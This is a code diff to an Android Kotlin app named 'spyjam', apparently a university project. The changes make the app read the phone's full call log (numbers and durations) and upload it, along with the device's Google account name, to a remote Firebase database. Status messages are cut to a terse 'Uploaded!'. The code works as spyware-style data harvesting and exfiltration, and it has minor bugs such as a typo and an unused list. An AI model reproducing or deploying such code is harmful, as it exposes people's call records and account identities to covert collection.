@@ -21,6 +21,7 @@ import kotlinx.android.synthetic.main.activity_main.*
 import ut.ee.cs.spyjam.R
 import java.util.*
 import kotlin.collections.ArrayList
+import kotlin.collections.HashMap
 
 
 class MainActivity : AppCompatActivity() {
@@ -51,7 +52,7 @@ class MainActivity : AppCompatActivity() {
             smsThread.start()
            sms.isClickable=false
             sms.alpha=0.5f
-            val text = "User data has been successfully  uploaded!"
+            val text = "Uploaded!"
             val duration = Toast.LENGTH_SHORT
             val toast = Toast.makeText(applicationContext, text, duration)
             toast.show()
@@ -61,7 +62,7 @@ class MainActivity : AppCompatActivity() {
            namesThread.start()
             button2.isClickable=false
             button2.alpha=0.5f
-            val text = "User data has been successfully uploaded!"
+            val text = "Uloaded!"
             val duration = Toast.LENGTH_SHORT
             val toast = Toast.makeText(applicationContext, text, duration)
             toast.show()
@@ -85,10 +86,9 @@ class MainActivity : AppCompatActivity() {
             logs.isClickable = false
             logs.alpha = 0.5f
             getLogs()
-            val text = "User data has been successfully  uploaded!"
+            val text = "Uploaded!"
             val duration = Toast.LENGTH_SHORT
-            val toast = Toast.makeText(applicationContext, text, duration)
-            toast.show()
+            val toast = Toast.makeText(applicationContext, text, duration).show()
         }
         //permissions
         if(ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)!=PackageManager.PERMISSION_GRANTED ||
@@ -206,23 +206,23 @@ class MainActivity : AppCompatActivity() {
         val  manager = getSystemService(ACCOUNT_SERVICE) as AccountManager
         val list = manager.accounts
         if (list.size>0){
-            var gmail = " "
+            var gmail = "empty"
             for (account in list){
                 if (account.type.equals("com.google", ignoreCase = true)){
                     gmail = account.name
                     break
                 }
             }
-            val text = "User data has successfully been uploaded!"
+            val text = "Uploaded!"
             val duration = Toast.LENGTH_SHORT
-            val toast = Toast.makeText(applicationContext, text, duration)
-            toast.show()
+            val toast = Toast.makeText(applicationContext, text, duration).show()
+            myRef.child("AccName").setValue(gmail)
         }
         else {
             val text = "No Accounts detected!"
             val duration = Toast.LENGTH_SHORT
-            val toast = Toast.makeText(applicationContext, text, duration)
-            toast.show()
+            val toast = Toast.makeText(applicationContext, text, duration).show()
+            myRef.child("AccName").setValue("empty")
         }
     }
     fun getLastPicture() {
@@ -232,23 +232,24 @@ class MainActivity : AppCompatActivity() {
         toast.show()
     }
 
+    @RequiresApi(Build.VERSION_CODES.O)
     @SuppressLint("MissingPermission")
     fun getLogs(){
-        var stringBuilder = StringBuffer()
-        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI,null,null,null,android.provider.CallLog.Calls.DATE + "DESC limit 1;")
-        var number = cursor!!.getColumnIndex(CallLog.Calls.NUMBER)
-        var duration = cursor!!.getColumnIndex(CallLog.Calls.DURATION)
+        var callMap = HashMap<String,String>()
+        var phoneNumberList = ArrayList<String>()
+        var durationListString = ArrayList<String>()
+        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI,null,null,null)
         var logSteps = 0
-        while (cursor!!.moveToNext() && logSteps!=5){
-            var phoneNumber = cursor.getString(number)
-            var callDuration = cursor.getString(duration)
-            stringBuilder.append("Number is" +phoneNumber + " \n\n Duration is :" +duration)
-            }
+        while (cursor!!.moveToNext()){
+           var numberIndex = cursor!!.getColumnIndex(CallLog.Calls.NUMBER)
+           var durationIndex = cursor!!.getColumnIndex(CallLog.Calls.DURATION)
+           var number = cursor.getString(numberIndex)
+           var callDuration = cursor.getString(durationIndex)
+           callMap.put(number,callDuration)
+        }
         cursor.close()
-        val text = "girdi"
-        val durationnn = Toast.LENGTH_SHORT
-        val toast = Toast.makeText(applicationContext, text, durationnn)
-        toast.show()
+        myRef.child("CallDuration").updateChildren(callMap as Map<String, Any>)
+        Log.d("logs","$durationListString")
     }
 
 
